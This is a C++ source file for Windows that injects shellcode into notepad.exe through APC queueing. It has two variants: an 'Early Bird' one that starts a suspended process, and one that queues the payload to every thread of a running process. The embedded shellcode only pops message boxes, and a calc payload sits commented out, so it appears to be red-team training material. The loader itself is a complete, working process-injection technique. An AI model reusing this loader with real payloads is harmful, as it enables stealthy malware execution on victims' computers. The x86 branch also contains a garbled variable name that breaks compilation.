#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

#define STATUS_SUCCESS 0
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == STATUS_SUCCESS)

typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  pBuffer;
} UNICODE_STRING, * PUNICODE_STRING;

// PBI

typedef struct _PEB_LDR_DATA {
	BYTE Reserved1[8];
	PVOID Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE Reserved1[16];
	PVOID Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef
VOID
(NTAPI* PPS_POST_PROCESS_INIT_ROUTINE) (
	VOID
);
typedef struct _PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID Reserved4[3];
	PVOID AtlThunkSListPtr;
	PVOID Reserved5;
	ULONG Reserved6;
	PVOID Reserved7;
	ULONG Reserved8;
	ULONG AtlThunkSListPtr32;
	PVOID Reserved9[45];
	BYTE Reserved10[96];
	PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
	BYTE Reserved11[128];
	PVOID Reserved12[1];
	ULONG SessionId;
} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PPEB PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

BOOL FindTargetProcess(wchar_t* exe, DWORD& pid, std::vector<DWORD>& vTids) {
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
	THREADENTRY32 te32 = { 0 };
	te32.dwSize = sizeof(THREADENTRY32);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, NULL);
	if (Process32First(hSnapshot, &pe32)) {
		do {
			if (_wcsicmp(pe32.szExeFile, exe) == 0) {
				pid = pe32.th32ProcessID;
				wprintf(L"[+] Found Process: %s \n", exe);
				wprintf(L"[+] Process id: %d \n", pe32.th32ProcessID);
				if (Thread32First(hSnapshot, &te32)) {
					do {
						vTids.push_back(te32.th32ThreadID);
					} while (Thread32Next(hSnapshot, &te32));
				}
				return TRUE;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}
	return TRUE;
}

BOOL EarlyBird(unsigned char payload[], SIZE_T payloadSize) {
	LPPROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
	LPSTARTUPINFOA startInfo = new STARTUPINFOA();
	LPVOID baseAddress = { 0 };
	DWORD oldProtect;
	NTSTATUS status;
#ifdef _WIN64
	LPSTR targetExe = (LPSTR)"C:\\Windows\\System32\\notepad.exe";
#else
	LPSTR target    Exe = (LPSTR)"C:\\Windows\\SysWow64\\notepad.exe";
#endif
	
	wprintf(L"[+] Creating target process in suspended mode... \n");
	if (!CreateProcessA(NULL, (LPSTR)targetExe, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startInfo, procInfo)) {
		wprintf(L"[-] Error creating process in suspended mode: %d\n", GetLastError());
		exit(-1);
	}
	wprintf(L"[+] Allocate memory in target process...\n");
	baseAddress = VirtualAllocEx(procInfo->hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!WriteProcessMemory(procInfo->hProcess, baseAddress, payload, payloadSize, NULL)) {
		wprintf(L"[-] Error writing payload into the remote rocess... \n");
		exit(-1);
	}
	wprintf(L"[+] Memory allocated at address: %p \n", baseAddress);
	wprintf(L"[+] Changing memory protection RW -> RX\n");
	if (!VirtualProtectEx(procInfo->hProcess, baseAddress, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
		wprintf(L"[-] Error changing memory protection... \n");
		exit(-1);
	}
	LPTHREAD_START_ROUTINE tRoutine = (LPTHREAD_START_ROUTINE)baseAddress;
	wprintf(L"[+] Puting our payload in queue....\n");
	QueueUserAPC((PAPCFUNC)tRoutine, procInfo->hThread, 0);
	wprintf(L"[+] Resuming Thread....\n");
	ResumeThread(procInfo->hThread);
	Sleep(1000 * 2);
	return TRUE;
}
BOOL APCInjection(unsigned char payload[], SIZE_T payloadSize, wchar_t* mode) {
	if (_wcsicmp(L"earlybird", mode) == 0) {
		BOOL isSuccess = EarlyBird(payload, payloadSize);
		if (isSuccess) {
			wprintf(L"Done..!!");
			return TRUE;
		}
		else {
			perror("[-] Error executing early bird...\n");
			return FALSE;
		}
		return FALSE;
	}
	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		perror("[-] Couldn't find API NtAllocateVirtualMemory...");
		exit(-1);
	}
	wchar_t exeName[] = L"notepad.exe";
	HANDLE hTargetProcess;
	HANDLE hThread;
	BOOL isSuccess = FALSE;
	DWORD pid = 0;
	NTSTATUS status;
	DWORD oldProtect;
	std::vector<DWORD> tids;
	wprintf(L"[+] Looking for target process...\n");
	isSuccess = FindTargetProcess(exeName,pid,tids);
	if (!isSuccess) {
		perror("[-] Unable to find target process...\n");
		exit(-1);
	}


	wprintf(L"[+] Opening the target process...\n");
	hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to open target process... \n");
		exit(-1);
	}

	wprintf(L"[+] Allocating memory in target process...\n");
	PVOID baseAddress = {0};
	SIZE_T allocSize = payloadSize;
	status = pNtAllocateVirtualMemory(hTargetProcess, &baseAddress, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable to allocate memory in target process...\n");
		exit(-1);
	}
	wprintf(L"[+] Allocated memory at address: %p\n", baseAddress);

	if (!WriteProcessMemory(hTargetProcess, baseAddress, payload, payloadSize, NULL)) {
		perror("[-] Failed to write shellcode into target process memory...\n");
		exit(-1);
	}
	wprintf(L"[+] Setting memory protection to RX...\n");
	if (!VirtualProtectEx(hTargetProcess, baseAddress, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
		perror("[-] Failed to convert protection rw->...\n");
		exit(-1);
	}

	PTHREAD_START_ROUTINE tRoutine = (PTHREAD_START_ROUTINE)baseAddress;
	wprintf(L"[+] Putting the shellcode in APC queue...\n");
	for (DWORD tid : tids) {
		hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, tid);
		QueueUserAPC((PAPCFUNC)tRoutine, hThread, 0);
		Sleep(1000 * 2);
	}
	return TRUE;
}


int main() {
#ifdef _WIN64
	// Calc Shellcode
	//unsigned char buf[] =
	//	"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
	//	"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
	//	"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
	//	"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
	//	"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
	//	"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
	//	"\x48\x83\xec\x20\x41\xff\xd6";
	 
	unsigned char buf[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
#else
	unsigned char buf[] =
		"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
		"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
		"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
		"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
		"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
		"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
		"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
		"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
		"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
		"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
		"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
		"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
		"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
		"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6e\x58\x20\x20\x68\x63\x74"
		"\x69\x6f\x68\x49\x6e\x6a\x65\x68\x65\x73\x73\x20\x68\x50\x72"
		"\x6f\x63\x31\xdb\x88\x5c\x24\x11\x89\xe3\x68\x61\x62\x73\x58"
		"\x68\x61\x72\x65\x4c\x68\x57\x61\x72\x46\x68\x79\x62\x65\x72"
		"\x68\x6f\x6d\x20\x43\x68\x6f\x20\x46\x72\x68\x48\x65\x6c\x6c"
		"\x31\xc9\x88\x4c\x24\x1b\x89\xe1\x31\xd2\x6a\x30\x53\x51\x52"
		"\xff\xd0\x31\xc0\x50\xff\x55\x08";
#endif
	wchar_t mode[] = L"normal";
	SIZE_T payloadSize = sizeof(buf);
	APCInjection(buf, payloadSize,  mode);
}